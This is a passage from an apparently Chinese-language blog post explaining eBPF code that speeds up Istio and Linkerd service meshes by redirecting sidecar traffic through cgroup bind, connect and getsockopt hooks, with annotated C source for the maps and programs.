                        \</span></span><br><span class="line">    (&#123;                                                                         \</span><br><span class="line">        <span class="keyword">char</span> ____fmt[] = fmt PRINT_SUFFIX;                                     \</span><br><span class="line">        bpf_trace_printk(____fmt, <span class="keyword">sizeof</span>(____fmt), ##__VA_ARGS__);             \</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEBUG</span></span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debugf(fmt, ...) (&#123;&#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">// only print traceing in debug mode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> debugf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debugf(fmt, ...)                                                       \</span></span><br><span class="line">    (&#123;                                                                         \</span><br><span class="line">        <span class="keyword">char</span> ____fmt[] = <span class="string">"[debug] "</span> fmt PRINT_SUFFIX;                          \</span><br><span class="line">        bpf_trace_printk(____fmt, <span class="keyword">sizeof</span>(____fmt), ##__VA_ARGS__);             \</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_port_listen_current_ns</span><span class="params">(<span class="keyword">void</span> *ctx, __u16 port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock_tuple</span> <span class="title">tuple</span> = &#123;</span>&#125;;</span><br><span class="line">    tuple.ipv4.dport = bpf_htons(port);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock</span> *<span class="title">s</span> = <span class="title">bpf_sk_lookup_tcp</span>(<span class="title">ctx</span>, &amp;<span class="title">tuple</span>, <span class="title">sizeof</span>(<span class="title">tuple</span>.<span class="title">ipv4</span>),</span></span><br><span class="line"><span class="class">                                           <span class="title">BPF_F_CURRENT_NETNS</span>, 0);</span></span><br><span class="line">    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">        bpf_sk_release(s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储源信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> &#123;</span></span><br><span class="line">    __u32 pid;</span><br><span class="line">    __u32 ip;</span><br><span class="line">    __u16 port;</span><br><span class="line">    <span class="comment">// last bit means that ip of process is detected.</span></span><br><span class="line">    __u16 flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储源ip 目的ip 源端口和目的端口</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pair</span> &#123;</span></span><br><span class="line">    __u32 sip;</span><br><span class="line">    __u32 dip;</span><br><span class="line">    __u16 sport;</span><br><span class="line">    __u16 dport;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="maps-h"><a href="#maps-h" class="headerlink" title="maps.h"></a><code>maps.h</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"helpers.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//保存原始目的地址信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">cookie_original_dst</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(struct origin_info),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前节点中的pod的ip信息,将已经注入Sidecar的Pod IP地址写入local_pod_ips</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">local_pod_ips</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">1024</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存envoy的ip地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">process_ip</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">1024</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存四元组信息和对应的原始目的地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">pair_original_dst</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(struct pair),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(struct origin_info),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前sock和四元组信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">sock_pair_map</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_SOCKHASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(struct pair),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="mb-bind-c"><a href="#mb-bind-c" class="headerlink" title="mb_bind.c"></a><code>mb_bind.c</code></h5><p>劫持 bind 系统调用并修改地址。目前该项目支持<code>Istio</code>和<code>linkerd</code>，<code>mb_bind.c</code>程序会判断<code>mesh</code>的类型是否为<code>linkerd</code>，如果是会将监听地址从<code>127.0.0.1:4140</code>变为<code>0.0.0.0:4140</code>，<code>4140</code>端口是<code>linkerd</code>的出站流量重定向端口。</p><p>在<code>mb_connect.c</code>中，作者为了避免四元组产生冲突，将目的地址修改为<code>127.x.y.z</code>而不是<code>127.0.0.1</code>，而在<code>linkerd</code>源码中是不允许修改的，如下图所示</p><p><img src="/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/2.png" alt="2"></p><p>针对该代码的具体细则可参考链接：<a href="https://github.com/linkerd/linkerd2-proxy/pull/1442" target="_blank" rel="noopener">https://github.com/linkerd/linkerd2-proxy/pull/1442</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/bind4"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_bind</span><span class="params">(struct bpf_sock_addr *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MESH != LINKERD</span></span><br><span class="line">    <span class="comment">// only works on linkerd</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;user_ip4 == <span class="number">0x0100007f</span> &amp;&amp;</span><br><span class="line">        ctx-&gt;user_port == bpf_htons(OUT_REDIRECT_PORT)) &#123;</span><br><span class="line">        __u64 uid = bpf_get_current_uid_gid() &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">        <span class="keyword">if</span> (uid == SIDECAR_USER_ID) &#123;</span><br><span class="line">            printk(<span class="string">"change bind address from 127.0.0.1:%d to 0.0.0.0:%d"</span>,</span><br><span class="line">                   OUT_REDIRECT_PORT, OUT_REDIRECT_PORT);</span><br><span class="line">            ctx-&gt;user_ip4 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-connect-c"><a href="#mb-connect-c" class="headerlink" title="mb_connect.c"></a><code>mb_connect.c</code></h5><p>劫持<code>connect</code>系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __u32 outip = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/connect4"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_sock4_connect</span><span class="params">(struct bpf_sock_addr *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// init，处理TCP流量</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;protocol != IPPROTO_TCP) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __u32 pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>; <span class="comment">// tgid</span></span><br><span class="line">    __u64 uid = bpf_get_current_uid_gid() &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断端口是否在监听当前的netns，以istio为例，OUT_REDIRECT_PORT是15001</span></span><br><span class="line">    <span class="comment">//如果15001端口没有监听当前ns，则绕过，只需要处理istio管理的pod间流量</span></span><br><span class="line">    <span class="keyword">if</span> (!is_port_listen_current_ns(ctx, OUT_REDIRECT_PORT)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//istio-proxy用户身份 uid为1337</span></span><br><span class="line">    <span class="comment">//1.如果uid不是1337</span></span><br><span class="line">    <span class="keyword">if</span> (uid != SIDECAR_USER_ID) &#123;</span><br><span class="line">        <span class="comment">//1.1进一步判断如果应用调用的是本地即127开头的话，则绕过</span></span><br><span class="line">        <span class="keyword">if</span> ((ctx-&gt;user_ip4 &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//1.2.uid不是1337且应用没有调用本地</span></span><br><span class="line">        debugf(<span class="string">"call from user container: ip: 0x%x, port: %d"</span>, ctx-&gt;user_ip4,</span><br><span class="line">               bpf_htons(ctx-&gt;user_port));</span><br><span class="line">        <span class="comment">//需要重定向到envoy处理</span></span><br><span class="line">        __u64 cookie = bpf_get_socket_cookie_addr(ctx); <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">        <span class="comment">//定义原始目的地址信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">origin</span> = &#123;</span></span><br><span class="line">            .ip = ctx-&gt;user_ip4,</span><br><span class="line">            .port = ctx-&gt;user_port,</span><br><span class="line">            .pid = pid,</span><br><span class="line">            .flags = <span class="number">1</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将cookie和源地址信息更新到cookie_original_dst中，更新成功返回0，失败返回负值</span></span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(&amp;cookie_original_dst, &amp;cookie, &amp;origin,</span><br><span class="line">                                BPF_ANY)) &#123;</span><br><span class="line">            printk(<span class="string">"write cookie_original_dst failed"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//应用向外发起连接时，将目标地址修改为 127.x.y.z:15001</span></span><br><span class="line">        <span class="comment">//之所以在connect时，修改目的地址为127.x.y.z而不是127.0.0.1</span></span><br><span class="line">        <span class="comment">//是因为在不同的Pod中，可能产生冲突的四元组，使用此方式即可巧妙地避开冲突</span></span><br><span class="line">        ctx-&gt;user_ip4 = bpf_htonl(<span class="number">0x7f800000</span> | (outip++));</span><br><span class="line">        <span class="keyword">if</span> (outip &gt;&gt; <span class="number">20</span>) &#123;</span><br><span class="line">            outip = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;user_port = bpf_htons(OUT_REDIRECT_PORT);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//uid=1337</span></span><br><span class="line">        <span class="comment">//2.从envoy到其他的情况</span></span><br><span class="line">        debugf(<span class="string">"call from sidecar container: ip: 0x%x, port: %d"</span>, ctx-&gt;user_ip4,</span><br><span class="line">               bpf_htons(ctx-&gt;user_port));</span><br><span class="line">        __u32 ip = ctx-&gt;user_ip4;</span><br><span class="line">        <span class="keyword">if</span> (!bpf_map_lookup_elem(&amp;local_pod_ips, &amp;ip)) &#123;</span><br><span class="line">            <span class="comment">//2.1.目的ip没有在节点中，绕过</span></span><br><span class="line">            debugf(<span class="string">"dest ip: 0x%x not in this node, bypass"</span>, ctx-&gt;user_ip4);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.2.目的地址在当前节点，但是不在当前pod</span></span><br><span class="line">        __u64 cookie = bpf_get_socket_cookie_addr(ctx); <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">        <span class="comment">//定义原始目的地址信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">origin</span> = &#123;</span></span><br><span class="line">            .ip = ctx-&gt;user_ip4,</span><br><span class="line">            .port = ctx-&gt;user_port,</span><br><span class="line">            .pid = pid,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//在process_ip中查找pid信息，process_ip中存储envoy的ip地址</span></span><br><span class="line">        <span class="keyword">void</span> *curr_ip = bpf_map_lookup_elem(&amp;process_ip, &amp;pid);</span><br><span class="line">        <span class="comment">//2.2.1如果存在则属于envoy到其他envoy</span></span><br><span class="line">        <span class="keyword">if</span> (curr_ip) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(__u32 *)curr_ip != ctx-&gt;user_ip4) &#123;</span><br><span class="line">                debugf(<span class="string">"enovy to other, rewrite dst port from %d to %d"</span>,</span><br><span class="line">                       ctx-&gt;user_port, IN_REDIRECT_PORT);</span><br><span class="line">                ctx-&gt;user_port = bpf_htons(IN_REDIRECT_PORT);</span><br><span class="line">            &#125;</span><br><span class="line">            origin.flags |= <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 2.2.2.envoy到应用程序，不用重写</span></span><br><span class="line">            origin.flags = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_RECONNECT</span></span><br><span class="line">            <span class="comment">// envoy to envoy</span></span><br><span class="line">            <span class="comment">// try redirect to 15006</span></span><br><span class="line">            <span class="comment">// but it may cause error if it is envoy call self pod,</span></span><br><span class="line">            <span class="comment">// in this case, we can read src and dst ip in sockops,</span></span><br><span class="line">            <span class="comment">// if src is equals dst, it means envoy call self pod,</span></span><br><span class="line">            <span class="comment">// we should reject this traffic in sockops,</span></span><br><span class="line">            <span class="comment">// envoy will create a new connection to self pod.</span></span><br><span class="line">            ctx-&gt;user_port = bpf_htons(IN_REDIRECT_PORT);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(&amp;cookie_original_dst, &amp;cookie, &amp;origin,</span><br><span class="line">                                BPF_NOEXIST)) &#123;</span><br><span class="line">            printk(<span class="string">"update cookie origin failed"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-get-sockopts-c"><a href="#mb-get-sockopts-c" class="headerlink" title="mb_get_sockopts.c"></a><code>mb_get_sockopts.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OPS_BUFF_LENGTH 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SO_ORIGINAL_DST 80 <span class="comment">//80是ORIGINAL_DST在内核中的编号</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/getsockopt"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_get_sockopt</span><span class="params">(struct bpf_sockopt *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//ebpf无法处理大于4096字节的数据</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;optlen &gt; MAX_OPS_BUFF_LENGTH) &#123;</span><br><span class="line">        debugf(<span class="string">"optname: %d, force set optlen to %d, original optlen %d is too "</span></span><br><span class="line">               <span class="string">"high"</span>,</span><br><span class="line">               ctx-&gt;optname, MAX_OPS_BUFF_LENGTH, ctx-&gt;optlen);</span><br><span class="line">        ctx-&gt;optlen = MAX_OPS_BUFF_LENGTH;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//代理把TCP连接拦截下来之后，并不知道原来的目标地址是什么，从而无法实现转发</span></span><br><span class="line">    <span class="comment">//Envoy收到连接之后会调用getsockopt获取原始目的信息</span></span><br><span class="line">    <span class="comment">//get_sockopts程序会根据四元组信息从pair_original_dst取出原始目的地址并返回给Envoy，由此连接完全建立</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;optname == SO_ORIGINAL_DST) &#123;</span><br><span class="line">        <span class="comment">//定义四元组结构体信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">            .dip = ctx-&gt;sk-&gt;src_ip4,</span><br><span class="line">            .dport = bpf_htons(ctx-&gt;sk-&gt;src_port),</span><br><span class="line">            .sip = ctx-&gt;sk-&gt;dst_ip4,</span><br><span class="line">            .sport = bpf_htons(ctx-&gt;sk-&gt;dst_port),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//根据四元组信息从pair_original_dst取出原始目的地址并返回</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> *<span class="title">origin</span> =</span></span><br><span class="line"><span class="class">            <span class="title">bpf_map_lookup_elem</span>(&amp;<span class="title">pair_original_dst</span>, &amp;<span class="title">p</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (origin) &#123; <span class="comment">// 重写原始目的地址</span></span><br><span class="line">            ctx-&gt;optlen = (__s32)<span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">            <span class="comment">//边界检查</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">void</span> *)((struct sockaddr_in *)ctx-&gt;optval + <span class="number">1</span>) &gt;</span><br><span class="line">                ctx-&gt;optval_end) &#123;</span><br><span class="line">                printk(<span class="string">"optname: %d: invalid getsockopt optval"</span>, ctx-&gt;optname);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将系统调用返回值重置为零</span></span><br><span class="line">            ctx-&gt;retval = <span class="number">0</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span> = &#123;</span></span><br><span class="line">                .sin_family = ctx-&gt;sk-&gt;family,</span><br><span class="line">                .sin_addr.s_addr = origin-&gt;ip,</span><br><span class="line">                .sin_port = origin-&gt;port,</span><br><span class="line">            &#125;;</span><br><span class="line">            *(struct sockaddr_in *)ctx-&gt;optval = sa;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-redir-c"><a href="#mb-redir-c" class="headerlink" title="mb_redir.c"></a><code>mb_redir.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 